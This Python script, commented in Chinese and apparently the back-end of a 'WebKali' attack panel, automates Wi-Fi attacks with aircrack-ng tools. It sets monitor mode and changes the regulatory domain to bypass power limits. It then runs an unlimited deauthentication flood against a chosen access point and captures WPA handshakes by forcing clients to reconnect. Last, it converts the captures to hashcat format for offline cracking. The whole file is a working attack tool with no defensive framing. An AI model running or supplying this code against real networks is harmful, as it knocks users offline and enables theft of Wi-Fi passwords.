import argparse
import subprocess
import time
import os
import sys
import shutil
import glob

# ==========================================
# WebKali 攻击执行单元 (完整修复版)
# ==========================================

# 修复环境变量，确保能找到工具
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    """执行命令但不阻塞，返回结果"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg, level="INFO"):
    """格式化输出，方便后端和前端读取"""
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    print(f"[{level}] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...", "DEBUG")

    # 1. 【关键修复】杀掉干扰进程 (针对 5GHz 跳频问题)
    run_cmd("airmon-ng check kill")

    # 2. 解锁功率限制 (尝试玻利维亚监管域)
    run_cmd("iw reg set BO")
    run_cmd("iwconfig moving_limits off")

    # 3. 尝试使用 airmon-ng 启动
    if shutil.which("airmon-ng"):
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"airmon-ng start {interface} {channel}")
        run_cmd(f"ip link set {interface} up")
    else:
        # 备用方案
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"iw dev {interface} set type monitor")
        run_cmd(f"ip link set {interface} up")

    # 4. 【关键修复】强制双重锁定信道 (防止 airodump 启动瞬间跳频)
    run_cmd(f"iw dev {interface} set channel {channel}")
    run_cmd(f"iwconfig {interface} channel {channel}")

    time.sleep(2)
    log(f"网卡 {interface} 已锁定在信道 {channel}", "SUCCESS")


def attack_deauth(bssid, interface, duration):
    """Deauth 洪水攻击"""
    log(f"🔥 开始 Deauth 攻击目标: {bssid} (Duration: {duration}s)", "INFO")

    # 0 表示无限攻击
    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"

    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    start_time = time.time()

    try:
        while True:
            if duration > 0 and (time.time() - start_time) > duration:
                break
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line and "Sending" in line and int(time.time()) % 3 == 0:
                print(f"[Attack] ⚡ 正在发送 Deauth 攻击包...")
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        try:
            process.terminate()
        except:
            pass
        run_cmd("killall aireplay-ng")
        log("攻击进程已结束", "SYSTEM")


def capture_handshake(bssid, interface, channel, duration):
    """【已修复】完整的握手包捕获逻辑"""
    duration = int(duration) if int(duration) > 0 else 60
    log(f"启动握手包捕获: Target={bssid} IFace={interface}", "START")

    # 文件前缀
    clean_bssid = bssid.replace(":", "")
    dump_prefix = f"/tmp/handshake_{clean_bssid}"
    run_cmd(f"rm -f {dump_prefix}*")

    # 1. 启动 airodump-ng (后台)
    airodump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {dump_prefix} --output-format cap {interface}"
    dump_proc = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start_time = time.time()
    handshake_captured = False

    try:
        time.sleep(5)  # 等待初始化

        while (time.time() - start_time) < duration:
            # 2. 循环攻击 (增强版 Deauth)
            log("发送 Deauth 包诱导重连...", "ATTACK")
            run_cmd(f"aireplay-ng -0 15 -a {bssid} {interface} --ignore-negative-one")

            # 3. 检查握手包
            cap_files = glob.glob(f"{dump_prefix}*.cap")
            if cap_files:
                latest_cap = max(cap_files, key=os.path.getctime)
                check_cmd = f"aircrack-ng {latest_cap} | grep '1 handshake'"
                result = subprocess.run(check_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        text=True)

                if "1 handshake" in result.stdout:
                    log("✅ 成功捕获握手包！", "SUCCESS")
                    print("CAPTURED_HS_POTENTIAL")  # 【后端识别标记】
                    handshake_captured = True

                    # 转换格式
                    if shutil.which("hcxpcapngtool"):
                        run_cmd(f"hcxpcapngtool -o {dump_prefix}.hc22000 {latest_cap}")
                    break

            time.sleep(8)  # 等待客户端重连

        if not handshake_captured:
            log("超时：未捕获到握手包", "FAIL")

    except Exception as e:
        log(f"Error: {e}", "ERROR")
    finally:
        try:
            dump_proc.terminate()
        except:
            pass
        run_cmd("killall airodump-ng")
        run_cmd("killall aireplay-ng")
        log("任务结束", "SYSTEM")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="0")
    args = parser.parse_args()

    setup_monitor(args.interface, args.channel)

    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, int(args.duration))
    elif args.mode == "handshake":
        capture_handshake(args.bssid, args.interface, args.channel, args.duration)